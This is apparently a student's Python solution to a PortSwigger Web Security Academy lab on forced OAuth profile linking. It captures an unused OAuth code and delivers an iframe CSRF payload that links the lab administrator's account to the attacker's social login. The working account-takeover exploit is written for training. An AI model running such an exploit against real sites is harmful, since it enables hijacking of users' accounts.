# Bradley Thompson
# CS595 Winter 2022 Final Project
# https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking

import urllib.parse
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse

from Helpers import parseArgsForSite, uploadExploit, searchResponse, checkForSiteLiveness

site = parseArgsForSite('https://ac271f0d1e444c01c0d97e4a00bf0044.web-security-academy.net/')
checkForSiteLiveness(site)
s = requests.Session()

if __name__ == "__main__":
    # Login to site with normal login flow to get attach social link
    login_url = f'https://{site}/login'
    resp = s.get(login_url)
    csrf = searchResponse(resp, 'input', {'name': 'csrf'}).get('value')
    login_data = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter'
    }
    resp = s.post(login_url, data=login_data)
    attach_social_url = searchResponse(resp, 'div', {'id': 'account-content'}).find('a').get('href')
    print('attach social url: ', attach_social_url)

    # Get path 'attach social' request redirects to
    resp = s.get(attach_social_url, allow_redirects=False)
    redirect_path_1 = searchResponse(resp, 'a').get('href')
    print(f'Path redirecting to (social login page): {redirect_path_1}\n')

    # login through oauth flow (social sign-in page & confirm oauth flow)
    oauth_site = attach_social_url.split('/')[2]
    resp = s.post(f'https://{oauth_site}{redirect_path_1}/login', data={
        'username': 'peter.wiener',
        'password': 'hotdog'
    })
    print(f'POST redirect_path_1/login responded with {resp.status_code} (redirect to confirm page)')
    resp = s.post(f'https://{oauth_site}{redirect_path_1}/confirm', allow_redirects=False)

    # Find validated oauth token in attempted redirect response
    oauth_token_get_url = resp.headers['Location']
    print(f'Confirm submission attempting to redirect to: {oauth_token_get_url}')
    oauth_token = searchResponse(s.get(oauth_token_get_url, allow_redirects=False), 'a').get('href').split('code=')[1]
    print(f'Found valid OAuth token! Token: {oauth_token}')

    # Make admin validate with this token
    exploit_payload = f'''
        <iframe src="https://{site}/oauth-linking?code={oauth_token}"></iframe>
    '''
    resp = uploadExploit(s, site, exploit_payload, 'DELIVER_TO_VICTIM')
    if resp.status_code == 200:
        print("Payload delivered to victim, login now.")
    # Now, in UI should be able to click "Log in with social media" and get logged in as admin.
    # Note: Not doing this part programmatically since I can just click 'login with social media', access
    #   control panel, and delete Carlos manually, super easily.
